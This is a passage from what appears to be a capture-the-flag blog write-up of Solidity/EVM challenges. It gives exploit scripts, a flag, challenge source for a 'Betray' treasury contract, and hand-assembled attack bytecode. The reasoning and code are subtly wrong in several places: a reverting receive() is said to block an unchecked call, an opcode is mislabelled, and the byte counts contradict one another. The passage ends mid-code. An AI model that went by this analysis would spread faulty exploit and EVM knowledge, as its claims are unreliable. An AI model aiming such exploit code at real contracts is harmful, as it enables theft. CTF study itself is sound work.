&lt;&#x2F;span&gt;&lt;span&gt;    Setup public set = Setup(0x457C34237d573e6207c8f65eAcc2f48dDa2ddD12);
&lt;&#x2F;span&gt;&lt;span&gt;    Challenge public challenge;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function run() public {
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Deploy our minimal contract
&lt;&#x2F;span&gt;&lt;span&gt;        AttackDeployer attack = new AttackDeployer();
&lt;&#x2F;span&gt;&lt;span&gt;        address addr = attack.exploit();
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Create input with our contract address and deadbeef
&lt;&#x2F;span&gt;&lt;span&gt;        bytes memory input = abi.encodePacked(address(addr), hex&amp;quot;deadbeef&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Call func with 3 wei (satisfies both value checks)
&lt;&#x2F;span&gt;&lt;span&gt;        challenge.func{value: 3 wei}(input);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The attack works because:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;Our deployed contract is exactly 24 bytes (satisfying size check)&lt;&#x2F;li&gt;
&lt;li&gt;We send 3 wei which:
&lt;ul&gt;
&lt;li&gt;Has exactly 2 bits set (11 in binary)&lt;&#x2F;li&gt;
&lt;li&gt;Is palindrome in binary (11)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Our contract returns correct values based on callvalue&lt;&#x2F;li&gt;
&lt;li&gt;The deadbeef value hashes to the required stick value&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;This is a great example of EVM bytecode optimization and understanding low-level contract behavior. The challenge tests knowledge of:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;EVM opcodes and bytecode&lt;&#x2F;li&gt;
&lt;li&gt;Contract deployment and size constraints&lt;&#x2F;li&gt;
&lt;li&gt;Binary number properties&lt;&#x2F;li&gt;
&lt;li&gt;Contract return value handling&lt;&#x2F;li&gt;
&lt;li&gt;Memory operations in EVM&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;The flag &lt;code&gt;h4v333_y0uuuu_r34d_EVMMM?&lt;&#x2F;code&gt; is well deserved for anyone who can solve this challenge!&lt;&#x2F;p&gt;
&lt;h1 id=&quot;betray&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#betray&quot; aria-label=&quot;Anchor link for: betray&quot;&gt;Betray&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;Setup.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.0;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;.&#x2F;Challenge.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Setup {
&lt;&#x2F;span&gt;&lt;span&gt;    address public immutable master;
&lt;&#x2F;span&gt;&lt;span&gt;    Treasury public treasury;
&lt;&#x2F;span&gt;&lt;span&gt;    SecretChecker public secretChecker;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor() payable {
&lt;&#x2F;span&gt;&lt;span&gt;        master = msg.sender;
&lt;&#x2F;span&gt;&lt;span&gt;        treasury = new Treasury{value : 1 ether}(msg.sender);
&lt;&#x2F;span&gt;&lt;span&gt;        secretChecker = new SecretChecker();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function isSolved() public returns (bool) {
&lt;&#x2F;span&gt;&lt;span&gt;        (bool MasterCanWithdraw, ) = address(treasury).call{gas : 1000000}(abi.encodeWithSignature(&amp;quot;withdraw()&amp;quot;));
&lt;&#x2F;span&gt;&lt;span&gt;        bool IKnowTheSecret = secretChecker.SecretIsLeaked();  
&lt;&#x2F;span&gt;&lt;span&gt;        return (!MasterCanWithdraw) &amp;amp;&amp;amp; IKnowTheSecret;   
&lt;&#x2F;span&gt;&lt;span&gt;    }    
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    receive() external payable {}
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;Challenge.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.0;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;interface Servant {
&lt;&#x2F;span&gt;&lt;span&gt;    function spillSecret() external view returns (bytes32);
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Master uses the below contract to pay your salary
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Treasury {
&lt;&#x2F;span&gt;&lt;span&gt;    address public servant; 
&lt;&#x2F;span&gt;&lt;span&gt;    address public immutable master;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public timesWithdrawn;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(address =&amp;gt; uint256) servantBalances; 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(address _master) payable{
&lt;&#x2F;span&gt;&lt;span&gt;        master = _master;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function withdraw() public {
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 dividend = address(this).balance &#x2F; 100;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        servant.call{value: dividend}(&amp;quot;&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        payable(master).transfer(dividend);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        timesWithdrawn++;
&lt;&#x2F;span&gt;&lt;span&gt;        servantBalances[servant] += dividend;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function BecomeServant(address _servant) external {
&lt;&#x2F;span&gt;&lt;span&gt;        servant = _servant;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function remainingTreasure() public view returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        return address(this).balance;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    receive() external payable {}
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract SecretChecker {
&lt;&#x2F;span&gt;&lt;span&gt;    bool public SecretIsLeaked;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping (bytes32 =&amp;gt; bool) public attempted;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function IKnowTheSecret(address _servant) public {
&lt;&#x2F;span&gt;&lt;span&gt;    require(!attempted[keccak256(abi.encodePacked(_servant))], &amp;quot;Won&amp;#39;t give another chance :p&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 length;
&lt;&#x2F;span&gt;&lt;span&gt;    assembly {
&lt;&#x2F;span&gt;&lt;span&gt;        length := extcodesize(_servant)
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    require(length &amp;lt;= 20, &amp;quot;HaHa! try again xD&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    Servant servant = Servant(_servant);
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 encodedSecret = servant.spillSecret();
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 secret = bytes32(abi.encodePacked(&amp;quot;I&amp;#39;m_L0yal;)&amp;quot;)) &amp;gt;&amp;gt; (24 * 7);
&lt;&#x2F;span&gt;&lt;span&gt;    require(keccak256(abi.encodePacked(secret)) == keccak256(abi.encodePacked(encodedSecret)), &amp;quot;You don&amp;#39;t know the secret!&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    attempted[keccak256(abi.encodePacked(_servant))] = true;
&lt;&#x2F;span&gt;&lt;span&gt;    SecretIsLeaked = true;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;p&gt;This challenge involves a Treasury contract that pays dividends to a servant and a master. The goal is to:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;Make the master unable to withdraw funds (revert the withdraw call)&lt;&#x2F;li&gt;
&lt;li&gt;Leak the secret from the servant&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h2 id=&quot;solution-2&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#solution-2&quot; aria-label=&quot;Anchor link for: solution-2&quot;&gt;Solution&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;Looking at the &lt;code&gt;isSolved()&lt;&#x2F;code&gt; function in Setup.sol:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;function isSolved() public returns (bool) {
&lt;&#x2F;span&gt;&lt;span&gt;    (bool MasterCanWithdraw, ) = address(treasury).call{gas : 1000000}(abi.encodeWithSignature(&amp;quot;withdraw()&amp;quot;));
&lt;&#x2F;span&gt;&lt;span&gt;    bool IKnowTheSecret = secretChecker.SecretIsLeaked();  
&lt;&#x2F;span&gt;&lt;span&gt;    return (!MasterCanWithdraw) &amp;amp;&amp;amp; IKnowTheSecret;   
&lt;&#x2F;span&gt;&lt;span&gt;}    
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;We need to satisfy two conditions:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;!MasterCanWithdraw&lt;&#x2F;code&gt;: The master&#x27;s withdraw call must revert&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;This means our servant contract must make the &lt;code&gt;withdraw()&lt;&#x2F;code&gt; function revert&lt;&#x2F;li&gt;
&lt;li&gt;We can do this by making our &lt;code&gt;receive()&lt;&#x2F;code&gt; function consume all gas&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;IKnowTheSecret&lt;&#x2F;code&gt;: The secret must be leaked&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;We need to deploy a contract that returns the correct secret&lt;&#x2F;li&gt;
&lt;li&gt;The contract must be ‚â§ 20 bytes in size&lt;&#x2F;li&gt;
&lt;li&gt;The secret is &quot;I&#x27;m_L0yal;)&quot; shifted right by 24*7 bits&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;The key contracts are:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Treasury&lt;&#x2F;code&gt;: Manages funds and pays dividends&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;SecretChecker&lt;&#x2F;code&gt;: Verifies if the secret is leaked&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;Servant&lt;&#x2F;code&gt;: Interface that requires implementing &lt;code&gt;spillSecret()&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;The vulnerability lies in the &lt;code&gt;withdraw()&lt;&#x2F;code&gt; function of the Treasury contract, which uses a low-level call to send funds to the servant without checking the return value. This allows us to deploy a malicious contract that can revert the transaction when receiving funds.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;solution-3&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#solution-3&quot; aria-label=&quot;Anchor link for: solution-3&quot;&gt;Solution&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;Let&#x27;s analyze the vulnerability and solution in detail:&lt;&#x2F;p&gt;
&lt;h3 id=&quot;vulnerability-analysis&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#vulnerability-analysis&quot; aria-label=&quot;Anchor link for: vulnerability-analysis&quot;&gt;Vulnerability Analysis&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Treasury Contract Vulnerability&lt;&#x2F;strong&gt;:&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;function withdraw() public {
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 dividend = address(this).balance &#x2F; 100;
&lt;&#x2F;span&gt;&lt;span&gt;    servant.call{value: dividend}(&amp;quot;&amp;quot;);  &#x2F;&#x2F; No return value check!
&lt;&#x2F;span&gt;&lt;span&gt;    payable(master).transfer(dividend);
&lt;&#x2F;span&gt;&lt;span&gt;    timesWithdrawn++;
&lt;&#x2F;span&gt;&lt;span&gt;    servantBalances[servant] += dividend;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The key vulnerability is in the &lt;code&gt;withdraw()&lt;&#x2F;code&gt; function:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;It uses a low-level &lt;code&gt;call&lt;&#x2F;code&gt; to send funds to the servant&lt;&#x2F;li&gt;
&lt;li&gt;The return value is not checked&lt;&#x2F;li&gt;
&lt;li&gt;If the servant&#x27;s &lt;code&gt;receive()&lt;&#x2F;code&gt; function reverts, the master&#x27;s transfer never happens&lt;&#x2F;li&gt;
&lt;li&gt;We can exploit this by making our servant contract revert on receive&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;&lt;strong&gt;SecretChecker Requirements&lt;&#x2F;strong&gt;:&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;function IKnowTheSecret(address _servant) public {
&lt;&#x2F;span&gt;&lt;span&gt;    require(!attempted[keccak256(abi.encodePacked(_servant))], &amp;quot;Won&amp;#39;t give another chance :p&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 length;
&lt;&#x2F;span&gt;&lt;span&gt;    assembly {
&lt;&#x2F;span&gt;&lt;span&gt;        length := extcodesize(_servant)
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    require(length &amp;lt;= 20, &amp;quot;HaHa! try again xD&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    Servant servant = Servant(_servant);
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 encodedSecret = servant.spillSecret();
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 secret = bytes32(abi.encodePacked(&amp;quot;I&amp;#39;m_L0yal;)&amp;quot;)) &amp;gt;&amp;gt; (24 * 7);
&lt;&#x2F;span&gt;&lt;span&gt;    require(keccak256(abi.encodePacked(secret)) == keccak256(abi.encodePacked(encodedSecret)), &amp;quot;You don&amp;#39;t know the secret!&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;We need to:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Deploy a contract ‚â§ 20 bytes&lt;&#x2F;li&gt;
&lt;li&gt;Implement &lt;code&gt;spillSecret()&lt;&#x2F;code&gt; to return the correct secret&lt;&#x2F;li&gt;
&lt;li&gt;The secret is &quot;I&#x27;m_L0yal;)&quot; shifted right by 24*7 bits&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Preventing Master&#x27;s Withdrawal&lt;&#x2F;strong&gt;:&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;We need to make the &lt;code&gt;withdraw()&lt;&#x2F;code&gt; function revert when sending funds to our servant&lt;&#x2F;li&gt;
&lt;li&gt;We can do this by implementing a &lt;code&gt;receive()&lt;&#x2F;code&gt; function that consumes all gas&lt;&#x2F;li&gt;
&lt;li&gt;An infinite loop in &lt;code&gt;receive()&lt;&#x2F;code&gt; will cause the transaction to revert&lt;&#x2F;li&gt;
&lt;li&gt;This prevents the master&#x27;s transfer from happening&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;&lt;strong&gt;Leaking the Secret&lt;&#x2F;strong&gt;:&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;We need to deploy a minimal contract that:
&lt;ul&gt;
&lt;li&gt;Is exactly 20 bytes in size&lt;&#x2F;li&gt;
&lt;li&gt;Returns the correct secret when &lt;code&gt;spillSecret()&lt;&#x2F;code&gt; is called&lt;&#x2F;li&gt;
&lt;li&gt;The secret is &quot;I&#x27;m_L0yal;)&quot; shifted right by 24*7 bits&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;&lt;strong&gt;Attack Flow&lt;&#x2F;strong&gt;:&lt;&#x2F;li&gt;
&lt;li&gt;Deploy our malicious contract that:
&lt;ul&gt;
&lt;li&gt;Has a gas-consuming &lt;code&gt;receive()&lt;&#x2F;code&gt; function&lt;&#x2F;li&gt;
&lt;li&gt;Returns the correct secret&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Set our contract as the servant&lt;&#x2F;li&gt;
&lt;li&gt;Call &lt;code&gt;withdraw()&lt;&#x2F;code&gt; which will:
&lt;ul&gt;
&lt;li&gt;Send funds to our contract&lt;&#x2F;li&gt;
&lt;li&gt;Our &lt;code&gt;receive()&lt;&#x2F;code&gt; function will revert&lt;&#x2F;li&gt;
&lt;li&gt;Master&#x27;s transfer never happens&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Verify the secret with &lt;code&gt;SecretChecker&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;writing-the-required-smart-contract-in-bytecode&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#writing-the-required-smart-contract-in-bytecode&quot; aria-label=&quot;Anchor link for: writing-the-required-smart-contract-in-bytecode&quot;&gt;Writing the Required Smart Contract in Bytecode&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;Let&#x27;s understand how we craft the minimal contract that satisfies all requirements:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Understanding Requirements&lt;&#x2F;strong&gt;:&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; From SecretChecker.sol
&lt;&#x2F;span&gt;&lt;span&gt;require(length &amp;lt;= 20, &amp;quot;HaHa! try again xD&amp;quot;);  &#x2F;&#x2F; Contract must be ‚â§ 20 bytes
&lt;&#x2F;span&gt;&lt;span&gt;bytes32 secret = bytes32(abi.encodePacked(&amp;quot;I&amp;#39;m_L0yal;)&amp;quot;)) &amp;gt;&amp;gt; (24 * 7);  &#x2F;&#x2F; Required secret
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;&lt;strong&gt;Breaking Down the Secret&lt;&#x2F;strong&gt;:&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; Original string: &amp;quot;I&amp;#39;m_L0yal;)&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Length: 10 bytes
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; After right shift by 24*7 bits:
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; 0x00000000000000000000000000000000000000000049276d5f4c3079616c3b29
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;&lt;strong&gt;Writing the Contract in Bytecode&lt;&#x2F;strong&gt;:&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;First, let&#x27;s write the initialization code:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;60 14       &#x2F;&#x2F; PUSH1 0x14 (20 bytes)
&lt;&#x2F;span&gt;&lt;span&gt;60 0c       &#x2F;&#x2F; PUSH1 0x0c (12 bytes)
&lt;&#x2F;span&gt;&lt;span&gt;60 00       &#x2F;&#x2F; PUSH1 0x00
&lt;&#x2F;span&gt;&lt;span&gt;39          &#x2F;&#x2F; CODESIZE
&lt;&#x2F;span&gt;&lt;span&gt;60 14       &#x2F;&#x2F; PUSH1 0x14
&lt;&#x2F;span&gt;&lt;span&gt;60 00       &#x2F;&#x2F; PUSH1 0x00
&lt;&#x2F;span&gt;&lt;span&gt;f3          &#x2F;&#x2F; RETURN
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This ensures our contract is exactly 20 bytes.&lt;&#x2F;p&gt;
&lt;p&gt;Now, let&#x27;s write the runtime code:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;6a          &#x2F;&#x2F; PUSH10 (push 10 bytes)
&lt;&#x2F;span&gt;&lt;span&gt;49 27 6d 5f 4c 30 79 61 6c 3b 29  &#x2F;&#x2F; &amp;quot;I&amp;#39;m_L0yal;)&amp;quot; (the secret)
&lt;&#x2F;span&gt;&lt;span&gt;60 00       &#x2F;&#x2F; PUSH1 0x00 (memory offset)
&lt;&#x2F;span&gt;&lt;span&gt;52          &#x2F;&#x2F; MSTORE (store in memory)
&lt;&#x2F;span&gt;&lt;span&gt;60 20       &#x2F;&#x2F; PUSH1 0x20 (32 bytes)
&lt;&#x2F;span&gt;&lt;span&gt;60 00       &#x2F;&#x2F; PUSH1 0x00 (memory offset)
&lt;&#x2F;span&gt;&lt;span&gt;f3          &#x2F;&#x2F; RETURN (return the secret)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ol start=&quot;4&quot;&gt;
&lt;li&gt;&lt;strong&gt;Combining the Bytecode&lt;&#x2F;strong&gt;:&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;&#x2F;&#x2F; Initialization code (12 bytes)
&lt;&#x2F;span&gt;&lt;span&gt;6014600c60003960146000f3
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Runtime code (8 bytes)
&lt;&#x2F;span&gt;&lt;span&gt;6a49276d5f4c3079616c3b2960005260206000f3
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Combined (20 bytes)
&lt;&#x2F;span&gt;&lt;span&gt;6014600c60003960146000f36a49276d5f4c3079616c3b2960005260206000f3
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ol start=&quot;5&quot;&gt;
&lt;li&gt;&lt;strong&gt;How it Works&lt;&#x2F;strong&gt;:&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;When deployed:
&lt;ol&gt;
&lt;li&gt;Initialization code runs first&lt;&#x2F;li&gt;
&lt;li&gt;Returns exactly 20 bytes of code&lt;&#x2F;li&gt;
&lt;li&gt;Runtime code is what remains after deployment&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;When &lt;code&gt;spillSecret()&lt;&#x2F;code&gt; is called:
&lt;ol&gt;
&lt;li&gt;Runtime code executes&lt;&#x2F;li&gt;
&lt;li&gt;Pushes &quot;I&#x27;m_L0yal;)&quot; onto stack&lt;&#x2F;li&gt;
&lt;li&gt;Stores it in memory&lt;&#x2F;li&gt;
&lt;li&gt;Returns it as the secret&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol start=&quot;6&quot;&gt;
&lt;li&gt;&lt;strong&gt;Verifying the Size&lt;&#x2F;strong&gt;:&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; In SecretChecker.sol
&lt;&#x2F;span&gt;&lt;span&gt;uint256 length;
&lt;&#x2F;span&gt;&lt;span&gt;assembly {
&lt;&#x2F;span&gt;&lt;span&gt;    length := extcodesize(_servant)
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;require(length &amp;lt;= 20, &amp;quot;HaHa! try again xD&amp;quot;);
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Our contract is exactly 20 bytes, satisfying this check.&lt;&#x2F;p&gt;
&lt;ol start=&quot;7&quot;&gt;
&lt;li&gt;&lt;strong&gt;Verifying the Secret&lt;&#x2F;strong&gt;:&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; In SecretChecker.sol
&lt;&#x2F;span&gt;&lt;span&gt;bytes32 encodedSecret = servant.spillSecret();
